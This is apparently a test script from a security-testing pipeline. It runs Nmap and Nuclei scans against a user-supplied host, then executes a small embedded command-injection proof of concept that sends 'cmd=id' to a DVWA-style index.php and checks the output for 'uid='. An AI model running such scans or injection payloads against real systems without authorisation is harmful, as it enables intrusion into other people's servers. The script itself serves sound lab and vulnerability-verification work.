#!/usr/bin/env python3
"""
취약 웹 서버 배포 및 테스트 스크립트

이 스크립트는:
1. 취약 웹 서버에 대한 스캔 실행
2. PoC 재현 테스트
3. 결과 검증
"""

import logging
import sys
from pathlib import Path

# 프로젝트 루트를 Python 경로에 추가
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.database import get_db, initialize_database
from src.pipeline.scanner_pipeline import ScannerPipeline
from src.pipeline.poc_pipeline import POCPipeline

logging.basicConfig(
    level=logging.INFO,
    format='%(levelname)s:%(name)s:%(message)s'
)
logger = logging.getLogger(__name__)


def test_vulnerable_web_deployment(target_host: str):
    """
    취약 웹 서버 배포 테스트
    
    Args:
        target_host: 취약 웹 서버 IP 주소 또는 도메인
    """
    logger.info("=" * 60)
    logger.info("취약 웹 서버 배포 테스트 시작")
    logger.info("=" * 60)
    logger.info(f"대상 호스트: {target_host}")
    logger.info("")
    
    # 1. 데이터베이스 초기화
    logger.info("[1/4] 데이터베이스 초기화")
    db = get_db()
    if not db.test_connection():
        logger.error("데이터베이스 연결 실패")
        return False
    
    # 스키마 초기화 (필요시)
    schema_file = PROJECT_ROOT / "src" / "database" / "schema.sql"
    if schema_file.exists():
        initialize_database(str(schema_file))
    
    logger.info("✓ 데이터베이스 연결 성공")
    logger.info("")
    
    # 2. 스캔 실행
    logger.info("[2/4] 취약점 스캔 실행")
    scanner_pipeline = ScannerPipeline()
    
    # Nmap 스캔
    logger.info(f"  - Nmap 스캔 실행: {target_host}")
    nmap_result = scanner_pipeline.run_nmap_scan(
        target=target_host,
        ports="22,80,443,3306",  # SSH, HTTP, HTTPS, MySQL
        scan_type="-sV",
        save_to_db=True
    )
    
    if nmap_result.get("status") == "failed":
        logger.error(f"  ✗ Nmap 스캔 실패: {nmap_result.get('error')}")
        return False
    
    logger.info(f"  ✓ Nmap 스캔 완료: {nmap_result.get('scan_id')}")
    
    # Nuclei 스캔
    logger.info(f"  - Nuclei 스캔 실행: {target_host}")
    nuclei_result = scanner_pipeline.run_nuclei_scan(
        target=f"http://{target_host}",
        save_to_db=True
    )
    
    if nuclei_result.get("status") == "failed":
        logger.warning(f"  ⚠ Nuclei 스캔 실패: {nuclei_result.get('error')}")
    else:
        logger.info(f"  ✓ Nuclei 스캔 완료: {nuclei_result.get('scan_id')}")
    
    # 스캔 결과 ID 조회
    with db.get_session() as session:
        from src.database.repository import ScanResultRepository
        repo = ScanResultRepository(session)
        recent = repo.get_recent(days=1, limit=1)
        if recent:
            scan_result_id = recent[0].id
            scan_target_host = recent[0].target_host
            logger.info(f"  ✓ 스캔 결과 저장됨 (ID: {scan_result_id}, Target: {scan_target_host})")
        else:
            logger.error("  ✗ 스캔 결과를 찾을 수 없음")
            return False
    
    logger.info("")
    
    # 3. PoC 재현 테스트
    logger.info("[3/4] PoC 재현 테스트")
    poc_pipeline = POCPipeline()
    
    # Command Injection PoC
    command_injection_poc = """
import sys
import requests

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/dvwa"
payload = "id"

# Command Injection 테스트
url = f"{target}/index.php?cmd={payload}"
response = requests.get(url, timeout=5)

if "uid=" in response.text or "gid=" in response.text:
    print("Command Injection 취약점 확인됨")
    sys.exit(0)
else:
    print("Command Injection 취약점 확인 실패")
    sys.exit(1)
"""
    
    poc_result = poc_pipeline.run_poc_reproduction(
        scan_result_id=scan_result_id,
        poc_script=command_injection_poc,
        poc_type="command_injection",
        cve_id="CWE-78",  # OS Command Injection
        source="test",
        collect_evidence=False
    )
    
    if poc_result.get("success"):
        logger.info(f"  ✓ PoC 재현 완료: {poc_result.get('reproduction_id')}")
        logger.info(f"    상태: {poc_result.get('status')}")
    else:
        logger.warning(f"  ⚠ PoC 재현 실패: {poc_result.get('error')}")
    
    logger.info("")
    
    # 4. 결과 요약
    logger.info("[4/4] 테스트 결과 요약")
    logger.info("=" * 60)
    logger.info("✓ 데이터베이스 연결: 성공")
    logger.info(f"✓ 스캔 실행: 성공 (ID: {scan_result_id})")
    logger.info(f"✓ PoC 재현: {'성공' if poc_result.get('success') else '실패'}")
    logger.info("")
    logger.info("다음 단계:")
    logger.info("  1. 대시보드에서 결과 확인: streamlit run src/dashboard/app.py")
    logger.info("  2. 리포트 생성: 대시보드에서 리포트 생성 버튼 클릭")
    logger.info("=" * 60)
    
    return True


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="취약 웹 서버 배포 테스트")
    parser.add_argument(
        "--target",
        type=str,
        required=True,
        help="취약 웹 서버 IP 주소 또는 도메인"
    )
    
    args = parser.parse_args()
    
    success = test_vulnerable_web_deployment(args.target)
    sys.exit(0 if success else 1)

